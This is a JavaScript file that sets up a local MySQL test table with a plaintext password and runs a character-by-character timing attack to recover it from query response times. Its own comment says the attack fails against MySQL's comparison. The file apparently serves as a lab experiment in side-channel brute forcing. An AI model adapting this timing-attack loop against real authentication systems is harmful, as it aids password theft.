import mysql from 'mysql2/promise';
// this does not work, mysql seems to have handled comparison safely
const username = 'alice';
const truePassword = 'apple123';
const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
const maxTries = 50;

const connection = await mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'root',
  database: 'test'
});

// Ensure the table and data exist
await connection.execute(`
  CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255),
    password VARCHAR(255)
  )
`);

const [existing] = await connection.execute(`SELECT COUNT(*) AS count FROM users`);
if (existing[0].count === 0) {
  await connection.execute(`
    INSERT INTO users (name, password) VALUES (?, ?)
  `, [username, truePassword]);
  console.log(`✅ Inserted test user: ${username} / ${truePassword}`);
}

function calculateStats(samples) {
  const mean = samples.reduce((a, b) => a + b, 0) / samples.length;
  const variance = samples.reduce((sum, val) => sum + (val - mean) ** 2, 0) / samples.length;
  const stdDev = Math.sqrt(variance);
  return { mean, stdDev };
}

async function measureGuessTime(guess) {
  const query = 'SELECT * FROM users WHERE name = ? AND password = ?';
  const timings = [];

  for (let i = 0; i < maxTries; i++) {
    const start = Date.now();
    await connection.execute(query, [username, guess]);
    const end = Date.now();
    timings.push(end - start);
  }

  return calculateStats(timings);
}

async function runAttack() {
  let guessed = '';

  console.log(`🔓 Starting timing attack on '${username}'...\n`);

  for (let pos = 0; pos < truePassword.length; pos++) {
    const results = [];

    for (const char of charset) {
      const attempt = guessed + char;
      const { mean, stdDev } = await measureGuessTime(attempt);

      results.push({ char, mean, stdDev });

      process.stdout.write(
        `\rTrying '${attempt.padEnd(truePassword.length)}' → ${mean.toFixed(2)}ms ± ${stdDev.toFixed(2)}ms`
      );
    }


    // Pick best based on highest mean with relatively low deviation
    results.sort((a, b) => {
      // Prefer higher mean and lower std dev
      const aScore = a.mean - a.stdDev;
      const bScore = b.mean - b.stdDev;
      return bScore - aScore;
    });

    const best = results[0];
    guessed += best.char;
    console.log(`✅ Position ${pos + 1}: '${best.char}' confirmed with ${best.mean.toFixed(2)}ms ± ${best.stdDev.toFixed(2)}ms\n`);
  }

  console.log(`\n✔️ Final guessed password: ${guessed}`);
  await connection.end();
}

runAttack();
